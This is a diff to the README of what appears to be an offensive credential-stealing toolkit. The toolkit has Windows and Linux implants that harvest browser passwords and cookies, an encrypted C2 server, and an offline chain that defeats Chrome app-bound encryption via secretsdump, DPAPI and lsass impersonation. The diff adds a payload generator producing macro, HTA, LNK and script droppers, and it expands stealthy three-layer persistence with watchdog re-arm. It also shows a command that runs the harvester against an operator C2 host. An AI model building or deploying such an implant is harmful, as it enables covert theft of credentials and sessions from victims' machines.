@@ -49,6 +49,7 @@ full offline unlock chain through Chrome 157 app-bound encryption (flag 4)
 - [What it is](#what-it-is)
 - [Why it's stealthy](#why-its-stealthy)
 - [Quick start](#quick-start) — operator · Windows target · Linux target
+- [Payloads & techniques](docs/PAYLOADS.md) — delivery vectors, ATT&CK matrix
 - [Repository layout](#repository-layout)
 - [Building the Windows implant](#building-the-windows-implant)
 - [Linux implant](#linux-implant)
@@ -101,7 +102,7 @@ no password, no injection, no COM calls.
 | no browser process termination | nothing ever kills or injects into the browser — no crash reports, no session restore prompts |
 | windowless, silent failure | release build is GUI-subsystem, zero console, zero dialogs; every helper process spawns `CreateNoWindow` |
 | opaque C2 | single AEAD blob per check-in; tasking is delivered encrypted with the same PSK — nothing readable on the wire |
-| stealthy persistence | user-level only (Run key + scheduled task), staged under `%APPDATA%\Microsoft`, self-configuring |
+| stealthy persistence | user-level only, 3 layers (task + Run key + Startup `.lnk` / systemd + cron + profile), watchdog re-arm, one-flag removal |
 | PSK never on disk in logs | build log prints a sha256 fingerprint only; the key lives XOR+base64 inside the binary |
 
 Honest limits: the Windows implant is .NET (CLR visibility is higher than
@@ -160,6 +161,7 @@ python3 sh_harvest.py --c2 http://YOUR.HOST:8443/gate --psk SECRET --auth opstok
 | `linux/sh_harvest.py` | Linux implant — single-file Python 3, stdlib only, ctypes-libcrypto fallback |
 | `server/collector.py` | C2: loot receiver, beacon/tasking queue, host registry, TLS, auth/allowlist/rate-limit |
 | `server/c2ctl.py` | operator CLI — hosts, task queueing (`--stages` / `--exec` / `--persist`) |
+| `tools/make_payload.py` | delivery generator — ps1 / bat / vbs / hta / lnk / docm-macro / sh / py stages (see [docs/PAYLOADS.md](docs/PAYLOADS.md)) |
 | `server/parse_loot.py` | bundle → report/creds/Netscape cookies; `--redact`/`--prune-days`/`--shred` |
 | `server/offline_unlock.py` | the offline chain: secretsdump → DPAPI → ABE flag-1..4 → plaintext |
 | `server/v20_live_unlock.py` | live-session variant (lsass impersonation, when you're on the box) |
